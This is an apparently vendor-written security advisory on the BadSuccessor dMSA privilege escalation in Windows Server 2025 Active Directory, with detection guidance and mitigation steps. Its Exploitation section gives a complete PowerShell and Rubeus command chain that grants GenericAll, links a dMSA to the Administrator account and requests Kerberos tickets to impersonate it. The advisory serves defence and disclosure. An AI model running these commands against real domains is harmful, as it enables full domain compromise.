---
title: "Privilege Escalation by Abusing dMSA: The BadSuccessor Vulnerability"
date: 2025-05-23
categories: [Active Directory, Vulnerability]
tags: [Active Directory]
image:
  path: assets/img/badsuccessor-vulnerability/BadSuccessor_Vulnerability.png
---

## **Executive Summary**

On **23.05.2025**, a new attack method exploiting the design flaw of the **Delegated Managed Service Account (dMSA)** feature that comes with **Windows Server 2025** was detected and the exploit code was published, by **Yuval Gordon** from **Akamai**. This method is called “**BadSuccessor**” and is classified as a new attack technique in addition to the already-known methods. With this technique, an unprivileged user in the Active Directory environment can log in and take over any administrator account name by abusing the dMSA accounts published by Microsoft. **This exploitation technique causes the entire Active Directory environment to be compromised.**

**Microsoft has not yet released a patch or documentation** on vulnerability. Vulnerability detection and mitigation operations can be carried out through the details in the document.

## **Introduction**

Through the technique known as **BadSuccessor**, disclosed by Akamai security researchers, an attacker can compromise the entire infrastructure **in environments utilizing Windows Server 2025 Domain Controllers** by leveraging two distinct attack scenarios.

The first scenario allows any **unprivileged user** or **computer** account within an Active Directory environment to create a vulnerable **dMSA** account, provided that it possesses the “**Create msDS-DelegatedManagedServiceAccount**” or “**Create all child objects**” permission on any “**Container**” or “**Organizational Unit**” object, or holds broadly defined rights encompassing these permissions such as “**GenericAll**,” “**WriteDACL**,” “**WriteOwner**,” or “**Owner**.”

In the second scenario, an attacker can create a vulnerable **dMSA** account that already exists in the Active Directory environment, as long as they have permission to write to the “**msDS-ManagedAccountPrecededByLink**” and “**msDS-DelegatedMSAState**” attributes of existing **dMSA** objects. This can also be done if they have broader privileges that include those permissions, such as “**GenericWrite**,” “**GenericAll**,” “**WriteDACL**,” “**WriteOwner**,” or “**Owner**.”

The attacker manipulates the “**msDS-ManagedAccountPrecededByLink**” and “**msDS-DelegatedMSAState**” attributes, which are the root cause of the vulnerability, to impersonate **the identity of a user of his choice, causing the entire Active Directory environment to be compromised**.

## **Vulnerability Detection**

The first requirement for exploiting the **BadSuccessor** vulnerability is the presence of at least one **Windows Server 2025 Domain Controller** within the Active Directory environment.

The second condition for exploiting the vulnerability is that at least one of the following requirements must be met:

1. If an unprivileged user has “**CreateAny**” (permission to create any object), “**CreateDMSA**” (permission to create DMSA object) or “**GenericAll**”, “**WriteDACL**”, “**WriteOwner**” or “**Owner**” permissions that allow direct or indirect modification of the object on “**Container**” and “**Organizational Unit**” objects.
2. If an unprivileged user has write access to the “**msDS-ManagedAccountPrecededByLink**” and “**msDS-DelegatedMSAState**” attributes of a previously created dMSA object—or holds broader privileges that include such access, such as “**GenericWrite**,” “**GenericAll**,” “**WriteDACL**,” “**WriteOwner**,” or “**Owner**”.

In order to identify exploitable assets, the PowerShell script released by the Akamai security team, which can be found at https://github.com/akamai/BadSuccessor/, can be utilized.

The Powershell script checks the “**CreateChild**”, “**GenericAll**”, “**WriteDACL**” and “**WriteOwner**” permissions on “**Organizational Unit**” objects and excludes some built-in identities in the Active Directory environment.

![Get-BadSuccessorOUPermissions](/assets/img/badsuccessor-vulnerability/1.png)

The vulnerability controls within the PowerShell script **do not cover all permissions that could enable attack vectors, nor do they analyze critical permissions on “Container” objects**. Therefore, performing a more comprehensive evaluation will provide greater visibility and allow for the identification of all potential attack paths.

The “**Search & Reports**” module on the **FSProtect** interface can be used to detect the relevant vulnerability.

- For **Windows Server 2025 Domain Controller** detection, the query prepared in the video in the [**related link**](https://forestallio.sharepoint.com/:v:/g/EbGZTDQDvDZHsasOI-QBl20BKdld3xsesTCh2AGgKy2DcQ) can be used.
- To detect dangerous access permissions that enable attack paths, the query demonstrated in the video at the [**related link**](https://forestallio.sharepoint.com/:v:/g/Ec4yO5S1iQBOjkFozcTGRfoBog_7-6nkXnkdQjbgFi1CDQ) can be used.

## **Exploitation**

As part of the **BadSuccessor** technique implementation, a computer account must be created. This computer account will later be used to read the password of the **dMSA** account to be created. The computer account used during exploitation can be created using the [**PowerMad**](https://github.com/Kevin-Robertson/Powermad) tool.

```powershell
# Creating a new computer object with the PowerMad tool
New-MachineAccount -MachineAccount AttackerComp -Password (ConvertTo-SecureString 'qwerty' -AsPlainText -Force) -DistinguishedName "CN=AttackerComp,CN=Computers,DC=test,DC=local"
```

![](/assets/img/badsuccessor-vulnerability/2.png)

To achieve privilege escalation within the domain, it is necessary either to create a **dMSA** account or to have write permissions on the **msDS-ManagedAccountPrecededByLink** and **msDS-DelegatedMSAState** attributes of an existing **dMSA** account.

```powershell
# Installing the Powershell Active Directory Module from Microsoft
Import-Module .\Microsoft.ActiveDirectory.Management.dll

# Creating the DMSA Object
New-ADServiceAccount -Name "vulnDMSA" -DNSHostName "dc2025.test.local" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "AttackerComp$" -path "OU=Test,DC=test,DC=local"
```

![](/assets/img/badsuccessor-vulnerability/3.png)

If the attacker creates the **dMSA** account, they won’t have permission to change its related attributes at first. So, they need to give themselves write access before they can make any changes.

```powershell
# Identification of the object controlled by the attacker
$identity = "TEST\Attacker"

# Identification of the DistinguishedName value of the target DMSA object
$objectDN = "CN=vulnDMSA,OU=Test,DC=test,DC=local"

# Obtaining ACLs for the DMSA object
$acl = Get-Acl "AD:$objectDN"

# Defining a variable of type NTAccount for the object controlled by the attacker
$identityRef = New-Object System.Security.Principal.NTAccount($identity)

# Creation of a GenericAll ACE object for the attacker
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $identityRef,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)

# Adding the created GenericAll ACE object to the ACL list of the DMSA object
$acl.AddAccessRule($ace)

# Updating ACLs on DMSA object with the new ACE added
Set-Acl -Path "AD:$objectDN" -AclObject $acl  
```

After granting write permissions on the necessary attributes, the attacker adds the chosen victim account to the **msDS-ManagedAccountPrecededByLink** attribute of the **dMSA** object and updates the **msDS-DelegatedMSAState** attribute to 2.

```powershell
# Creating the required LDAP path for the DMSA object
$dMSA = [ADSI]"LDAP://CN=vulnDMSA,OU=Test,DC=test,DC=local"

# Updating the msDS-DelegatedMSAState value on the DMSA object to 2 (Migration Finished)
$dMSA.Put("msDS-DelegatedMSAState", 2)

# Updating the msDS-ManagedAccountPrecededByLink value on the DMSA object with the DistinguishedName of the Administrator object
$dMSA.Put("msDS-ManagedAccountPrecededByLink", "CN=Administrator,CN=Users,DC=test,DC=local")

# Saving changes made on the DMSA object
$dMSA.SetInfo()
```

![](/assets/img/badsuccessor-vulnerability/4.png)

During the creation of the **dMSA** account, the attacker obtains the TGT ticket associated with the machine account they are using via the **PrincipalsAllowedToRetrieveManagedPassword** configuration, making this machine account the preferred choice since it has the necessary permissions to read the **dMSA** object’s password.

```powershell
# Receiving the required TGT ticket for the previously added computer account
Rubeus.exe asktgt /user:AttackerComp$ /password:qwerty /enctype:aes256 /nowrap
```

![](/assets/img/badsuccessor-vulnerability/5.png)

With the obtained **TGT** ticket, a **TGS** ticket is requested on behalf of the **DMSA** account and then the exploitation is completed by using this **TGS** ticket.

```
# Obtaining the TGS ticket for the DMSA account using the previously acquired TGT ticket
Rubeus.exe asktgs /targetuser:vulnDMSA$ /service:krbtgt/test.local /dmsa /opsec /nowrap /ptt /ticket:<base64_ticket>
```

![](/assets/img/badsuccessor-vulnerability/6.png)

![](/assets/img/badsuccessor-vulnerability/7.png)

## **Mitigation Steps**

1. In order for the relevant vulnerability to be exploited, one of the following conditions must be met:
    - If an unprivileged user has **CreateAny** (permission to create any object), **CreateDMSA** (permission to create a DMSA object) or **GenericAll**, **WriteDACL** permissions which allow direct or indirect modification of the object on **Container** and **Organizational Unit** objects
    - Permissions of an unprivileged user to write to **msDS-ManagedAccountPrecededByLink** and **msDS-DelegatedMSAState** values on a previously created **dMSA** object or the existence of broader permissions such as **GenericWrite**, **GenericAll**, **WriteDACL** that allow direct or indirect modification of the **dMSA** object
2. In order to eliminate the vulnerability, it is necessary to remove the permissions mentioned above, which are defined for unprivileged users on both **Container** and **Organizational Unit** objects and **dMSA** objects that have already been created. The following steps can be applied sequentially to carry out this process.
    - Log in to the **Domain Controller** server and open the **Active Directory Users and Computers** application.
    - Identify the **Container**, **Organizational Unit**, or **dMSA** account that has permissions, then right-click the relevant object and select the **Properties** button.

![](/assets/img/badsuccessor-vulnerability/8.png)

- In the opened window, click on the **Security** tab.

![](/assets/img/badsuccessor-vulnerability/9.png)

- In the opened window, click on the **Advanced** tab.

![](/assets/img/badsuccessor-vulnerability/10.png)

- Double-click on the detected risky permissions to open the details page.

![](/assets/img/badsuccessor-vulnerability/11.png)

- Remove the detected risky permissions, then click the **OK and Apply** buttons to save the changes.

![](/assets/img/badsuccessor-vulnerability/12.png)

## **References**

- https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa
- https://github.com/akamai/BadSuccessor
- https://forestallio.sharepoint.com/:v:/g/EbGZTDQDvDZHsasOI-QBl20BS32XkyKJglWISGWbKqqa_g?e=MKfPTO
- https://forestallio.sharepoint.com/:v:/g/Ec4yO5S1iQBOjkFozcTGRfoBiRCZXfheYRJWYElixikyaw?e=9DJRWk
- https://github.com/Kevin-Robertson/Powermad
- https://github.com/GhostPack/Rubeus/pull/194